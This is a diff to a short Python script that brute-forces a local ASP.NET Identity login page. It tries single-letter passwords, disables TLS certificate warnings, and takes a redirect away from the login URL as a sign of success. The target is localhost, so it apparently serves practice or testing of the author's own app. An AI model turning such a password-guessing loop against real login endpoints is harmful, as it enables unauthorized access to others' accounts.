@@ -1,4 +1,7 @@
 import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 headers = {
     'authority': 'localhost:44302',
@@ -27,11 +30,14 @@ data = {
 
 alphabet = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
 
-for x in alphabet:
-    data['Input.Password'] = x
+for a in alphabet:
+    data['Input.Password'] = a
     response = requests.post('https://localhost:44302/Identity/Account/Login', headers=headers, data=data, verify=False)
     url_length = len(response.url)
     last_part = response.url[(url_length - 5):url_length]
     if last_part != "Login":
-        print("The password is: " + x)
+        print("The password is: " + a)
         break
+    else :
+        print("Tried password: " + a)
+        
